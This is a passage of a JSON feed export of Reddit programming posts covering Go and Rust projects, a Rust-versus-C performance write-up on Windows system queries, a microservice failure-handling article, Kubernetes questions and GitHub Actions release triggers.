OpenAI enormous flexibility: the same model can generate text, images, and audio within a single, unified token stream.</p><p>The tradeoff? Token-by-token generation can be slow, especially for large or high-resolution images. And it’s extremely computationally expensive. But since GPT-4o runs entirely in the cloud, OpenAI isn’t as constrained by latency or power use.</p><p>In short: both Apple and OpenAI are moving beyond diffusion, but while OpenAI is building for its data centers, Apple is clearly building for our pockets.</p><div><p><em>FTC: We use income earning auto affiliate links.</em><a href=\"https://9to5mac.com/about/#affiliate\">More.</a></p><a href=\"https://bit.ly/4k3qtZw\"><img src=\"https://9to5mac.com/wp-content/uploads/sites/6/2025/06/trmnl.gif\" alt=\"\" width=\"1024\" height=\"205\"></a></div>","contentLength":3826,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1lls33i/apple_research_just_unearthed_a_forgotten_ai/"},{"title":"I built a small social network in go","url":"https://github.com/tzrn/minimint","date":1751023095,"author":"/u/Aggravating_Fault398","guid":173671,"unread":true,"content":"<p>It has messaging, hashtags, global chat with MMO-like isometric visualization of every person in the chat, and support for music/videos/pictures/files both in messages and posts. UI looks good both on desktop and mobile, but it's rather minimal. Every user has a page where he can post stuff. Also users can follow other users, so their posts will be displayed in their feed. You can also reply to posts. For db I used sqlite and for chats I used gorilla/websocket library. It's on github under 0BSD License. I also built client in html/js/css which server hosts with http.FileServer. </p><p>There is a lot of repeated code like code for authorization below in every handler, or similar logic for some requests but I couldn't figure out a better way that is also simple.</p><pre><code>err := json.NewDecoder(r.Body).Decode(&amp;a) if err != nil { return jErr } ok := auth(db, a) if !ok { return aErr } </code></pre><p>The most interesting part to implement was messaging and global chat with web sockets. It first goes in a loop until authorized and then goes to the main loop. When user sends message and server successfully processed it, it sends back signal that everything's fine so client can display message he just sent. I really like that all functionality is contained in single binary, so I don't need to install anything on server. There's even autocert library which automatically generates https certificate.</p><p>For now each user can only have one session so every time a user logs in, his other session logs out.</p><p>I have experimented with writing TUI messaging client with bubbletea and it works really nice. I also tried to write messaging client for android but it's been hard.</p><p>Feedback would be appreciated.</p>","contentLength":1675,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1llrb5c/i_built_a_small_social_network_in_go/"},{"title":"Catching Up with Fastfetch: A Rust Journey","url":"https://www.reddit.com/r/rust/comments/1llratt/catching_up_with_fastfetch_a_rust_journey/","date":1751023064,"author":"/u/ahaoboy","guid":173912,"unread":true,"content":"<p>My project, <a href=\"https://github.com/ahaoboy/neofetch\">neofetch</a>, was one of my earliest Rust learning exercises, inspired by <a href=\"https://github.com/dylanaraps/neofetch\">dylanaraps/neofetch</a>, a bash tool designed to display system information. At the time, I didn’t know how to use msys2 on Windows, so I chose Rust to make it work natively on that platform. This post chronicles my journey of optimizing its performance specifically for Windows.</p><h2>Initial Implementation: Executing Commands</h2><p>The initial approach was simple: execute system commands (bash on Unix, PowerShell on Windows), capture their output, parse it with regular expressions, and display the results. For example, to retrieve the OS version on Windows, I used:</p><p><code>pwsh powershell -c \"Get-CimInstance -ClassName Win32_OperatingSystem\" </code></p><p>As a Rust novice, this method was straightforward and functional. Performance wasn’t a concern—until I encountered <a href=\"https://github.com/fastfetch-cli/fastfetch\">fastfetch</a>. To my surprise, my Rust implementation was slower than the original shell script!</p><p>After a quick peek at fastfetch’s code, I set out to improve my project’s performance. The first version (v0.1.7) was painfully slow, taking about 5 seconds to execute commands serially. My first optimization was to use <a href=\"https://tokio.rs/\">Tokio</a> to run all commands in parallel. In theory, this would reduce the execution time to that of the longest individual task. Sure enough, after integrating Tokio, the time dropped to around 2.5 seconds—a solid gain, but still sluggish compared to fastfetch’s 150ms.</p><p>The bottleneck in parallel tasks often lies in the slowest single task. On Windows, invoking command-line tools carries more overhead than I’d anticipated. Following fastfetch’s lead, I turned to lower-level system APIs. I adopted <a href=\"https://github.com/ohadravid/wmi-rs\">WMI</a>, a Rust crate that wraps Windows Management Instrumentation, enabling direct API calls.</p><p>WMI also supports asynchronous operations, which allowed further speed improvements. For tasks requiring multiple API calls—such as detecting the shell by checking process names—async calls proved invaluable. After switching to WMI, the execution time fell to about 500ms. Here’s a snippet of how I queried the OS version:</p><p>struct OperatingSystem { #[serde(rename = \"Version\")] version: String, } let results: Vec&lt;OperatingSystem&gt; = wmi_query().await?; ```</p><h3>Going Lower-Level with windows-rs</h3><p>Still, 500ms wasn’t fast enough. Rust is often touted as having performance on par with C/C++, which holds true for compute-intensive tasks like calculating Fibonacci numbers or leveraging SIMD for image processing. However, when interacting with a C-based operating system like Windows, Rust typically relies on wrapper libraries unless you resort to  code for direct API calls. These wrappers can introduce overhead.</p><p>Take, for instance, determining the current shell, as explored in my <a href=\"https://github.com/ahaoboy/which-shell\">which-shell</a> project. This requires fetching the current process ID, name, and parent process ID, then traversing the process tree to identify a known shell. With WMI, this often took three or four calls, each costing around 100ms, making it the most time-consuming task.</p><p>To address this, I switched to <a href=\"https://github.com/microsoft/windows-rs\">windows-rs</a>, a lower-level crate providing direct access to Windows APIs. Though more complex to use, it delivered a significant performance boost. Paired with Tokio, this brought the execution time down to around 200ms—finally comparable to fastfetch. Interestingly, fastfetch offers more features and doesn’t seem to rely on multithreading (I’m no C expert, but I didn’t spot obvious multithreading logic in its code).</p><p>Here are the benchmark results:</p><p>``` Benchmark 1: neofetch Time (mean ± σ): 109.6 ms ± 14.8 ms [User: 26.0 ms, System: 110.3 ms] Range (min … max): 93.1 ms … 143.5 ms 10 runs</p><p>Benchmark 2: fastfetch Time (mean ± σ): 127.6 ms ± 14.6 ms [User: 42.6 ms, System: 75.9 ms] Range (min … max): 105.4 ms … 144.7 ms 10 runs</p><p>Benchmark 3: neofetch-shell Time (mean ± σ): 1.938 s ± 0.089 s [User: 0.495 s, System: 1.181 s] Range (min … max): 1.799 s … 2.089 s 10 runs</p><p>Summary neofetch ran 1.16 ± 0.21 times faster than fastfetch 17.68 ± 2.52 times faster than neofetch-shell ```</p><p>These figures show that my neofetch now slightly outperforms fastfetch and leaves the original shell-based version in the dust.</p><p>I couldn’t help but wonder if there was room for even more improvement. To investigate, I created a <a href=\"https://github.com/ahaoboy/process-info-bench\">benchmark project</a> comparing C and Rust implementations of a simple task: calculating the depth of the current process in the process tree.</p><p>Rust lagged slightly behind C versions compiled with different compilers. Could this be due to residual overhead in <a href=\"https://github.com/microsoft/windows-rs\">windows-rs</a>, despite its low-level nature? Here are the results:</p><p>``` Benchmark 1: gcc.exe Time (mean ± σ): 50.4 ms ± 4.0 ms [User: 13.0 ms, System: 33.7 ms] Range (min … max): 45.9 ms … 67.6 ms 54 runs</p><p>Benchmark 2: g++.exe Time (mean ± σ): 48.5 ms ± 2.0 ms [User: 16.3 ms, System: 27.7 ms] Range (min … max): 45.4 ms … 54.4 ms 49 runs</p><p>Benchmark 3: clang.exe Time (mean ± σ): 48.7 ms ± 1.7 ms [User: 15.6 ms, System: 28.5 ms] Range (min … max): 45.8 ms … 52.9 ms 51 runs</p><p>Benchmark 4: rust.exe Time (mean ± σ): 53.3 ms ± 2.7 ms [User: 14.1 ms, System: 34.0 ms] Range (min … max): 48.7 ms … 65.3 ms 48 runs</p><p>Summary g++.exe ran 1.00 ± 0.05 times faster than clang.exe 1.04 ± 0.09 times faster than gcc.exe 1.10 ± 0.07 times faster than rust.exe ```</p><p>While Rust comes remarkably close, a small performance gap persists compared to C. This suggests that for certain low-level operations, C may retain a slight edge, possibly due to Rust’s safety mechanisms or wrapper library overhead.</p>","contentLength":5520,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Another Go variable dumper and interface/types explorer!","url":"https://www.reddit.com/r/golang/comments/1llr1a6/another_go_variable_dumper_and_interfacetypes/","date":1751022130,"author":"/u/mind-crawler","guid":174015,"unread":true,"content":"<div><p>I just released a small Go utility library called <a href=\"https://github.com/janvaclavik/govar\"></a> — it's designed to help you inspect variables and interfaces more easily when debugging or exploring Go code. There are already some similar ones, but I tried to make this one as complete as possible. </p><ul><li> with structure-aware output </li><li>Handles nested types, pointers, structs, slices, maps, and more</li><li>Colorful output | ANSI terminal colors or styled HTML</li><li>Size &amp; cap info | Shows lengths and capacities</li><li>Includes a  subpackage for exploring type and interface information</li></ul></div>   submitted by   <a href=\"https://www.reddit.com/user/mind-crawler\"> /u/mind-crawler </a>","contentLength":547,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[R] Enigmata: Scaling Logical Reasoning In LLMs With Synthetic Verifiable Puzzles","url":"https://arxiv.org/abs/2505.19914","date":1751020852,"author":"/u/EducationalCicada","guid":173852,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/MachineLearning/comments/1llqoj1/r_enigmata_scaling_logical_reasoning_in_llms_with/"},{"title":"Techniques for handling failure scenarios in microservice architectures","url":"https://www.cerbos.dev/blog/handling-failures-in-microservice-architectures","date":1751019655,"author":"/u/West-Chard-1474","guid":173609,"unread":true,"content":"<p>Microservices have become the backbone of scalable and agile applications. However, their distributed nature introduces complexities, especially when dealing with failures.</p><p>The microservice architectural style divides applications into small, autonomous services, each responsible for a specific business capability. While microservices promise flexibility and scale, but they also multiply your failure points; every service you split out is another thing that can break.</p><p>This article explores the strategies for managing failure scenarios in microservice architectures. It covers techniques to address both technical glitches and business impacts. You will learn how organizations can build fault-tolerant systems that are capable of gracefully handling cascading failures while maintaining core functionalities, even in a degraded state.</p><p>So what actually keeps microservices reliable? It starts with —the idea that each microservice should operate independently, like apartments in a building with proper fireproofing between units. When one service catches fire, the isolation ensures the flames don't spread to its neighbors. This independence becomes your first line of defense against cascading failures.</p><p> works hand-in-hand with isolation. When you design services to be stateless, any instance can handle any request—there's no \"special\" server that holds critical information. Think of it like a taxi service where any driver can take you to your destination, versus needing one specific driver who knows where you're going. This approach simplifies both scaling (just add more taxis) and fault recovery (if one breaks down, grab another).</p><p>Of course, you still need <strong>redundancy and replication</strong> as your safety net. Running multiple instances of services and replicating data means that when components inevitably fail, you've got backups ready to take over. But redundancy alone isn't enough—you need these systems to detect failures and recover automatically. The <a href=\"https://www.cerbos.dev/blog/testing-and-deployment-strategies-microservices\">best microservice</a> architectures don't wait for someone to notice problems; they pick themselves up and keep running.</p><p>All of this only works if you can actually see what's happening inside your system. <strong>Continuous monitoring and logging</strong> act as your eyes and ears across the distributed landscape. Without proper observability, you're essentially flying blind—you might have all the right patterns in place, but you won't know when they're being triggered or if they're working as intended.</p><h2>Independence leads to complexity</h2><p>While microservices promote autonomy, this independence can lead to complexities. With each service managing its own data, ensuring  across services becomes challenging. When you manage multiple services, it increases the overall complexity and  of deployments, monitoring, and maintenance. Once those services are running, they engage in <strong>inter-service communication</strong> to, which by definition introduces latency and potential points of failure.</p><h2>Concerning autonomy and reliability</h2><p>There's a balance to be found when considering service autonomy and the need for reliable communication.</p><p> calls (e.g., HTTP) are straightforward but can lead to tight coupling and latency issues.  messaging (e.g., message queues) decouples services but adds complexity in ensuring message delivery and handling eventual consistency. But what about the services themselves?</p><p>Dynamic  eliminates hardcoded endpoints, allowing services to find each other as instances scale up and down. But this flexibility comes at a cost—the discovery mechanism itself becomes critical infrastructure that must stay highly available. Once services can find each other, you need  to distribute requests evenly across instances, preventing any single instance from becoming overwhelmed. This adds another network hop to every request and requires careful configuration to quickly detect and route around unhealthy instances.</p><p>Many organizations end up implementing a , as it can provide observability, secure connections, and automate retries and backoff for failed requests, thus facilitating reliable inter-service communication.</p><p>Failures in microservice architectures tend to have weird emergent behaviours—and they spread like wildfire. Understanding common patterns (and ) helps you to build systems that won't burn down. While every system is unique, and every problem is different, there are some common patterns that exist across all microservice-based stacks.</p><p> occur when network-level communication between services is disrupted, leading to isolated segments within the larger system. Such partitions can cause services to perform operations on outdated information, or fail to coordinate, resulting in inconsistent states and outcomes.</p><p>Instead of a complete failure, a service may experience reduced performance, such as increased latency or limited functionality. This  can strain dependent services, leading to a ripple effect of <a href=\"https://www.cerbos.dev/blog/performance-and-scalability-microservices\">performance</a> issues across the system. A failure in one service can trigger failures in dependent services, creating a chain reaction of . For example, if Service A relies on Service B, and Service B fails, Service A may also fail or degrade, affecting any services that depend on Service A.</p><p>Degradation states can cause situations that don't result in immediate failures, but as they accumulate over time, it leads to further degraded performance, or outright unexpected behavior. Worse, they often go unnoticed until they impact user experience or system reliability.</p><p>Consider the case of a : when services automatically retry failed requests without proper backoff strategies, they can overwhelm the system (think that annoying person who keeps hitting the elevator button—except they're doing it thousands of times per second). This excessive load can exacerbate existing issues.</p><p>In microservice architectures, services are interconnected, and dependencies are common. A failure in one service can propagate through these dependencies, affecting multiple parts of the system. For example, if a payment processing service fails, it can impact order fulfillment, inventory management, and customer notifications.</p><p>Resilient microservices need strategies that keep them standing even when things go wrong. Let’s take a look at some of the key patterns and considerations.</p><p>Think of  as the safety valves of your system—they know when to say \"enough is enough\" and stop the madness before everything explodes. When a service experiences repeated failures, the circuit breaker \"trips,\" halting further requests to the failing service for a specified period. This prevents the system from continually attempting operations that are likely to fail, allowing the problematic service time to recover. Once the service shows signs of stability, the circuit breaker allows limited traffic to test its health before fully restoring operations. This pattern is crucial for preventing cascading failures and maintaining overall system responsiveness.</p><p>The  pattern involves partitioning system resources, such as thread pools or connection pools, so that failures in one component do not impact others. By isolating services, a failure in one area is contained, ensuring that other parts of the system continue to function normally. This approach enhances fault tolerance and prevents a single point of failure.</p><p>Setting appropriate  for service calls is clutch to prevent the system from waiting indefinitely for a response. Timeouts ensure that unresponsive services do not tie up resources, allowing the system to fail fast and maintain overall responsiveness. It's important to configure timeouts based on the expected response times of services, considering factors like network latency and processing time.</p><p>Implementing  mechanisms allows services to handle transient failures gracefully. When a request fails due to temporary issues like network glitches, the system can automatically retry the operation after a short delay. To avoid overwhelming services with repeated retries, strategies like exponential backoff (increasing the wait time between retries) and jitter (adding randomness to wait times) can used. These techniques help balance the need for reliability with system stability.</p><h2>Balancing consistency and availability</h2><p>In distributed systems, achieving both strong consistency and high availability simultaneously can be challenging, especially during network partitions. The  states that a system can only guarantee two out of three: Consistency, Availability, and Partition tolerance. Therefore, trade-offs are necessary. For example, some systems prioritize availability and accept eventual consistency, ensuring that all nodes will converge to the same state over time. Others may prioritize consistency, ensuring that all nodes reflect the most recent write, even if it means some requests might be denied during partitions.</p><h2>Monitoring and observability for distributed systems</h2><p>Monitoring involves collecting predefined data points to track system performance and health. Observability, on the other hand, provides a deeper insight into the system's internal states by analyzing outputs like logs, metrics, traces, and more. So what actually makes a distributed system observable?</p><p> tracks requests as they flow through various microservices, assigning unique identifiers to each request. This approach helps pinpoint where delays or failures occur within the system. The tools like  <a href=\"https://zipkin.io/\">Zipkin</a> help in this process, providing visibility into service interactions.</p><p> involves collecting data such as latency, error rates, and resource utilization across services. Aggregated metrics provide a comprehensive view of system performance, enabling teams to identify trends and anomalies.</p><p>Brass tacks: good monitoring solutions catch problems . Therefore, effective alerts should be , precise, and context-rich, ensuring that teams can respond swiftly to issues. You can implement  that helps in understanding how different alerts relate, reducing noise and focusing on critical incidents.</p><p>As logs are generated by multiple services, <strong>centralized log aggregation</strong> is a must-have. By consolidating logs into a single reference point, teams can analyze system behaviors more effectively. This centralized approach helps in troubleshooting and supports decision-making by providing a unified view of system activities.</p><h2>Response and recovery approaches</h2><p>Let's discuss a few response and recovery strategies for maintaining the resilience of microservices architectures.</p><p>By implementing <strong>automated recovery mechanisms</strong> in microservices environments, you can minimize downtime and ensure service continuity. Self-healing systems are designed to detect, diagnose, and recover from failures without human intervention. Key techniques include continuous health checks and monitoring to detect anomalies, circuit breakers (which I mentioned prevously) to prevent cascading failures, retry mechanisms with exponential backoff strategies, and automated failover to switch to redundant systems when primary services fail.</p><p>A well-defined <strong>incident command structure</strong> ensures coordinated and efficient responses to incidents. The <em>Incident Command System (ICS)</em> is a standardized approach that includes roles such as the Incident Commander, responsible for overall incident management; Command Staff, including Safety Officer, Liaison Officer, and Public Information Officer; and General Staff, comprising Operations, Planning, Logistics, and Finance/Administration Sections. This structure promotes clear roles, responsibilities, and communication pathways during incident response.</p><p>But even if you don't use an industrial command structure, having clear <strong>communication and escalation protocols</strong> will make incident response much better. The best practices involve defining communication channels using tools like email, chat platforms, and incident management systems for timely information sharing. You should establish escalation policies with criteria for escalating incidents to higher support levels based on severity. When you keep stakeholders informed regularly, it helps maintain transparency and trust.</p><h2>Organizational considerations</h2><p>There's an entire blog post to be written on just this subject, but it's important to at least mention some of the organizational considerations for maintaining reliable distributed systems.</p><p>When you conduct post-mortems after incidents, it allows teams to analyze what went wrong, understand the root causes, and implement measures to prevent future occurrences. A  approach encourages open dialogue, where the focus is on learning rather than assigning blame. This environment promotes transparency and continuous improvement.</p><p>Good post-mortems all share some key characteristics.  uses standardized templates to record incident details, timelines, impact assessments, and corrective actions. This allows teams to collaborate cross-functionally to gain diverse perspectives and build better knowledge bases. Ultimately, the goal is to <strong>generate actionable results</strong>, and identify specific steps to address root causes and prevent recurrence.</p><p>But that's just one tool in the toolbox. To build the team's expertise in failure analysis, organizations have to take an active role in <strong>training and simulated exercises</strong>. <a href=\"https://en.wikipedia.org/wiki/Chaos_engineering\">Chaos engineering</a> gamedays are a great learning experience (and a lot of fun, too). You can organize workshops and courses on incident management and root cause analysis, equipping team members with the necessary skills to identify and address system failures.</p><p>The truth is, building reliable microservices isn't about preventing all failures; it's about failing gracefully when things inevitably go sideways. Every pattern and practice we've covered—from bulkheads to blameless post-mortems—exists because someone, somewhere, learned these lessons the hard way. Perfect microservices don't exist—but . Start with circuit breakers, add proper monitoring, and please, practice your incident response before you need it. Your future self will thank you during the next production outage.</p>","contentLength":13989,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1llqct4/techniques_for_handling_failure_scenarios_in/"},{"title":"Weekly: Share your victories thread","url":"https://www.reddit.com/r/kubernetes/comments/1llq0wp/weekly_share_your_victories_thread/","date":1751018433,"author":"/u/gctaylor","guid":173557,"unread":true,"content":"<p>Got something working? Figure something out? Make progress that you are excited about? Share here!</p>","contentLength":98,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Suggesting a slightly modified logo for the subreddit","url":"https://www.reddit.com/r/golang/comments/1llpk6x/suggesting_a_slightly_modified_logo_for_the/","date":1751016565,"author":"/u/steveiliop56","guid":173558,"unread":true,"content":"<p>I noticed that the gopher logo in the subreddit looks a bit weird since the ears of the gopher are cropped due to the circle image. So I fired up gimp and in 512x512px canvas added the gopher with 400px width and aligned it in the center with a y offset of 128. This way when it's set as a logo in a circle image the center will be the upper part of the gopher, so the eyes/ears. Hope you like it!</p>","contentLength":397,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"A 10-chapter handbook for writing actually secure Rust: type-safety, panic-proofing & more.","url":"https://www.reddit.com/r/rust/comments/1llo602/a_10chapter_handbook_for_writing_actually_secure/","date":1751010734,"author":"/u/RiskWise2545","guid":173640,"unread":true,"content":"<p>Hey there! I just published a draft of the  (Markdown only).</p><p> type-level safety, panic-proofing, integer-overflow guards, crypto basics, async pitfalls, and a deploy checklist.</p>","contentLength":175,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] Thinking, Fast and Slow","url":"https://www.reddit.com/r/MachineLearning/comments/1llo5nt/d_thinking_fast_and_slow/","date":1751010695,"author":"/u/mio_11","guid":173703,"unread":true,"content":"<p>To the theorists in the community, how do you balance 1. engaging with theory research - which is usually a slow process requiring deep thinking 2. with programming - which is fast-paced, iterative process with quick feedback? I'm finding switching between the two thinking modes very hard to balance.</p>","contentLength":301,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Understanding K8s as a beginner","url":"https://www.reddit.com/r/kubernetes/comments/1llo2ks/understanding_k8s_as_a_beginner/","date":1751010338,"author":"/u/New-Chef4442","guid":173495,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>I have been drawing out the entire internal architecture of a bare bones K8s system with a local path provider and flannel so i can understand how it works.</p> <p>Now i have noticed that it uses ALOT of &quot;containers&quot; to do basic stuff, like how all the kube-proxy does it write to the host&#39;s ip-table.</p> <p>So obviously these are not the standard Docker container that have a bare bones OS because even a bare bones OS would be too much for doing these very simplistic tasks and create too much overhead.</p> <p>How would an expert explain what exactly the container inside a pod is?</p> <p>Can i compare them with how things like AWS Lambda and Azure Functions work where they are small pieces of code that execute and exit quickly? But from what i understand even these Azure Functions have a ready to deploy container with and OS?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/New-Chef4442\"> /u/New-Chef4442 </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1llo2ks/understanding_k8s_as_a_beginner/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1llo2ks/understanding_k8s_as_a_beginner/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Long time Gnome fanboy. But KDE rocks!","url":"https://www.reddit.com/r/linux/comments/1llntip/long_time_gnome_fanboy_but_kde_rocks/","date":1751009290,"author":"/u/better_life_please","guid":173741,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>I&#39;ve used gnome exclusively since a few years ago when I switched to Linux. I had never been interested in KDE Plasma DE mostly because it looks like Windows shell.</p> <p>I decided to switch to Fedora Kinoite a few days ago for a fresh experience. And OMG, KDE Plasma keeps impressing me every hour I play/tinker with it!!!</p> <p>Can&#39;t believe I&#39;ve missed it for so long. It&#39;s simply in another league. Not comparable to Gnome or Windows shell or macOS. It&#39;s so polished and has some smart features.</p> <p>One problem that I could never solve on Gnome was connecting my console to the laptop via an Ethernet cable and sharing the VPN connection with the console (some games can&#39;t be played in my area due to geo blocking, etc). Well, KDE has straight forward options in the settings app for that kind of configure. And it was so simple and seamless!</p> <p>I&#39;m probably staying on KDE for a long time.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/better_life_please\"> /u/better_life_please </a> <br/> <span><a href=\"https://www.reddit.com/r/linux/comments/1llntip/long_time_gnome_fanboy_but_kde_rocks/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1llntip/long_time_gnome_fanboy_but_kde_rocks/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Optimizing Godog BDD Test Execution in Go – How to Run Scenarios in Parallel?","url":"https://www.reddit.com/r/golang/comments/1llnlp2/optimizing_godog_bdd_test_execution_in_go_how_to/","date":1751008396,"author":"/u/Available-Lunch-4842","guid":174014,"unread":true,"content":"<p>I'm using the Godog BDD framework in Go to run a test suite with around  spread across multiple  files.</p><p>Currently, the tests run  and take about  to complete. I'm looking for a way to <strong>parallelize scenario execution</strong> to reduce total runtime, ideally making better use of available CPU cores.</p><p>I'm aware that  itself can run in parallel at the package level, but since Godog runs all scenarios within a single test function, it doesn’t leverage itself.  for each scenario by default.</p><p><strong>Has anyone successfully implemented true scenario-level parallelism in Godog?</strong></p><ul><li>Does Godog offer any  or pattern for <strong>parallel scenario execution</strong>?</li><li>Are there community-recommended practices (e.g., worker pools or test runners) to parallelize test scenarios safely?</li><li>How do you handle  like config files, HTTP mocks, or DB connections while keeping scenarios isolated?</li></ul><p>Any tips or examples would be much appreciated. Thanks in advance!</p>","contentLength":904,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Glowstick: type-level tensor shapes","url":"https://github.com/nicksenger/glowstick","date":1751003670,"author":"/u/biet_roi","guid":173773,"unread":true,"content":"<p>I've been doing some ML experiments locally in rust (mostly diffusion stuff, distillation &amp; grpo training) and wanted to have the compiler verify tensor dimensions through various operations, so I made this crate <a href=\"https://github.com/nicksenger/glowstick\">glowstick</a>. It uses type-level programming to keep track of the shapes in the type system, so that you can check shapes at compile time, avoid mismatches, etc. Mixing and matching static/dynamic dimensions is also supported, so you can trade safety for flexibility when necessary.</p><p>I've added integrations for the candle and burn frameworks, with example implementations of Llama 3.2 in each. Some folks were also interested in whether these types could be used for optimizations, which wasn't my original goal. But, it seems like they  can be - so I added an example of how to specialize some operation for tensors of a certain shape.</p><p>I hope it's helpful to some here, and appreciate any feedback. Also, I acknowledge that the code probably looks a bit unusual - so am happy to answer any questions about that as well (and am open to suggestions from those of you more familiar with rust's trait solver)</p>","contentLength":1113,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1llmdcy/glowstick_typelevel_tensor_shapes/"},{"title":"Just shipped Jobs & CronJobs support in Kube Composer - no more YAML hell for batch jobs!","url":"https://www.reddit.com/r/kubernetes/comments/1llldqy/just_shipped_jobs_cronjobs_support_in_kube/","date":1751000160,"author":"/u/same7ammar","guid":173420,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Hey <a href=\"/r/kubernetes\">r/kubernetes</a></p> <p>After grinding through this for the past few weeks, I finally got Jobs and CronJobs working in Kube Composer with the same smooth UI as our Deployments feature.What I built:</p> <p><strong>Jobs:</strong></p> <ul> <li>Multi-container support with resource limits</li> <li>Environment variables (ConfigMaps/Secrets integration)</li> <li>Job completion settings</li> </ul> <p><strong>CronJobs:</strong></p> <ul> <li>Cron schedule with validation</li> <li>Concurrency policies</li> <li>History limits</li> <li>Starting deadline</li> </ul> <p><strong>Perfect for:</strong></p> <ul> <li>DevOps engineers tired of writing YAML for batch jobs</li> <li>Developers who need scheduled data pipelines</li> <li>K8s starters who&#39;s learning kubernetes .</li> </ul> <p>The interface hooks right into existing ConfigMaps and Secrets, so you can manage complex job configs without touching the CLI.</p> <p>Check it out: <a href=\"http://kube-composer.com\">kube-composer.com</a></p> <p>Let me know what you think! Any feedback or feature requests are welcome.</p> <p><strong>⭐ Star us on GitHub — it helps!</strong> <a href=\"https://github.com/same7ammar/kube-composer\">https://github.com/same7ammar/kube-composer</a></p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/same7ammar\"> /u/same7ammar </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1llldqy/just_shipped_jobs_cronjobs_support_in_kube/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1llldqy/just_shipped_jobs_cronjobs_support_in_kube/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Architectural constraints that make vibe coded software maintainable","url":"https://www.reddit.com/r/artificial/comments/1llkma9/architectural_constraints_that_make_vibe_coded/","date":1750997580,"author":"/u/amitksingh1490","guid":173853,"unread":true,"content":"<p> AI agent could crank out compiling code in minutes, but I’d burn hours verifying its logic. The culprit wasn’t the agent; It was the architecture. By giving it infinite ways to solve every problem, that practically invited convoluted solutions.</p><p>So we tightened the rules: one clear, opinionated path per task. Suddenly the agent’s output was not just syntactically correct, it was obviously correct and maintainable.</p><p>Would love to hear how you curb complexity in your own vibe coded applications?</p>","contentLength":501,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Drop-in cargo replacement for offloading Rust compilation to a remote server","url":"https://www.reddit.com/r/rust/comments/1lljcqz/dropin_cargo_replacement_for_offloading_rust/","date":1750993464,"author":"/u/Ferr3t","guid":173815,"unread":true,"content":"<p>As much as I adore working with large Rust codebases, one daily annoyance I have is the local computational load from executing cargo commands. It slows down dev cycles and keep me tethered to the wall.</p><p>About 6 months ago, inspired by , I built .</p><p>My goal for the tool is to have dead-simple devex, as similar as  as possible. Just replace  with , everything happens as you expect, except the computation happens on a remote server.</p><pre><code>crunch check crunch clippy --workspace crunch t -p sys-internals </code></pre><p>A couple of close devs and I have been using it with a shared Hetzner AX102, and are really enjoying the experience!</p><p>I know this is a common issue for Rust devs, so figured I'd share.</p><p>Feedback welcome. Cheers!</p>","contentLength":701,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Invalid Bulk Response Error in Elasticsearch","url":"https://www.reddit.com/r/kubernetes/comments/1llj4wz/invalid_bulk_response_error_in_elasticsearch/","date":1750992785,"author":"/u/anonymous_hackrrr","guid":172676,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>We deployed Elasticsearch on a Kubernetes cluster with three nodes.</p> <p>After logging in using the correct username and password, developers encounter an &quot;Invalid Bulk Response&quot; error while using it.</p> <p>We also tested a similar setup using Docker Compose and Terraform — the same error occurs there too.</p> <p>However, no errors are shown in logs in either case, and all containers/pods appear healthy.</p> <p>Do you have any suggestions on how to troubleshoot this?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/anonymous_hackrrr\"> /u/anonymous_hackrrr </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1llj4wz/invalid_bulk_response_error_in_elasticsearch/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1llj4wz/invalid_bulk_response_error_in_elasticsearch/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Github actions, what trigger is most common for creating binaries","url":"https://www.reddit.com/r/golang/comments/1llj3pf/github_actions_what_trigger_is_most_common_for/","date":1750992678,"author":"/u/First-Ad-2777","guid":172699,"unread":true,"content":"<p>Hello. I see you can use Github Actions to create Go binaries. My question is, upon what \"event\" do folks usually trigger release builds?</p><p>I figure I could l trigger off PR merges, OR after tagging. I don't know the pros and cons, or which is the most popular \"convention\" in open source projects? This is more of a \"where\" question.</p><p>At this point I don't have any serious coding project. I'm simply exploring GH Actions, so I understand how GH's CICD system works regarding builds. 